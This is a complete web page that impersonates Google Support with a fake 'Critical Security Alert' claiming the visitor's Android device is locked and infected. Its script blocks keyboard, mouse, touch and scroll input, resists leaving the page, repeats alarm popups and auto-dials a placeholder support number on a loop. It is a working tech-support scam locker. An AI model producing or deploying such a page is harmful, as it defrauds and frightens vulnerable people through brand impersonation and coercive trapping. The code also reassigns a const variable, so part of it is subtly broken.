<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Google Support - Critical Security Alert</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            overflow: hidden;
            touch-action: none;
            -webkit-user-select: none;
            user-select: none;
            height: 100vh;
            width: 100vw;
        }
        .freeze-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.95);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .alert-popup {
            background: white;
            border-radius: 12px;
            padding: 30px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 2px solid #ea4335;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        .google-logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
            background: #4285f4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 30px;
        }
        .alert-title {
            font-size: 22px;
            color: #ea4335;
            margin-bottom: 15px;
            font-weight: bold;
        }
        .alert-message {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
            color: #5f6368;
        }
        .phone-number {
            font-size: 24px;
            font-weight: bold;
            color: #4285f4;
            margin: 20px 0;
            padding: 10px;
            background: #f1f8fe;
            border-radius: 8px;
            cursor: pointer;
        }
        .call-button {
            background-color: #ea4335;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
        .countdown {
            font-size: 14px;
            color: #ea4335;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="freeze-overlay" id="freezeOverlay">
        <div class="alert-popup">
            <div class="google-logo">G</div>
            <div class="alert-title">CRITICAL SECURITY ALERT</div>
            <div class="alert-message">
                Your Android device has been locked due to suspicious activity. 
                Multiple malware threats detected. Immediate action required to prevent data loss.
            </div>
            <div class="phone-number" id="tfn">1-888-888-8888</div>
            <div class="alert-message">
                Call Google Support immediately to unlock your device and remove threats.
            </div>
            <button class="call-button" onclick="initiateCall()">CALL SUPPORT NOW</button>
            <div class="countdown" id="countdown">A
                uto-calling in: 10 seconds</div>
        </div>
    </div>

    <script>
        // Set toll-free number variable
        const TFN = "18888888888"; // Remove dashes for tel: protocol
        document.getElementById('tfn').textContent = formatPhoneNumber(TFN);

        // Freeze page completely
        function freezePage() {
            // Disable all user interactions
            document.addEventListener('keydown', blockAllEvents, true);
            document.addEventListener('mousedown', blockAllEvents, true);
            document.addEventListener('touchstart', blockAllEvents, true);
            document.addEventListener('contextmenu', blockAllEvents, true);
            document.addEventListener('scroll', blockAllEvents, true);
            
            // Disable text selection
            document.body.style.webkitUserSelect = 'none';
            document.body.style.mozUserSelect = 'none';
            document.body.style.msUserSelect = 'none';
            document.body.style.userSelect = 'none';
            
            // Disable zooming and scrolling
            document.body.style.overflow = 'hidden';
            document.documentElement.style.overflow = 'hidden';
            
            // Disable back button and refresh
            window.onbeforeunload = function() {
                return "Security alert in progress. Do not leave this page.";
            };
            
            // Disable right-click menu
            document.oncontextmenu = function() {
                return false;
            };
        }

        function blockAllEvents(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }

        // Format phone number for display
        function formatPhoneNumber(num) {
            return num.replace(/(\d{1})(\d{3})(\d{3})(\d{4})/, '$1-$2-$3-$4');
        }

        // Initiate phone call
        function initiateCall() {
            window.location.href = 'tel:' + TFN;
        }

        // Auto-call countdown
        let countdown = 10;
        const countdownElement = document.getElementById('countdown');
        const countdownInterval = setInterval(() => {
            countdown--;
            countdownElement.textContent = `Auto-calling in: ${countdown} seconds`;
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                initiateCall();
                // Restart countdown after call attempt
                setTimeout(() => {
                    countdown = 10;
                    countdownElement.textContent = `Auto-calling in: ${countdown} seconds`;
                    countdownInterval = setInterval(() => {
                        countdown--;
                        countdownElement.textContent = `Auto-calling in: ${countdown} seconds`;
                        if (countdown <= 0) {
                            clearInterval(countdownInterval);
                            initiateCall();
                        }
                    }, 1000);
                }, 5000);
            }
        }, 1000);

        // Freeze page on load
        window.onload = function() {
            freezePage();
            
            // Additional pop-up alerts every 30 seconds
            setInterval(() => {
                alert("URGENT: Your Android device remains compromised. Call " + formatPhoneNumber(TFN) + " immediately to resolve security issues.");
            }, 30000);
        };

        // Prevent any escape attempts
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' || e.keyCode === 27) {
                e.preventDefault();
                alert("Cannot exit security alert. Call support to resolve.");
            }
        });

        // Continuous focus on the overlay
        setInterval(() => {
            document.getElementById('freezeOverlay').style.display = 'flex';
        }, 100);
    </script>
</body>
</html>
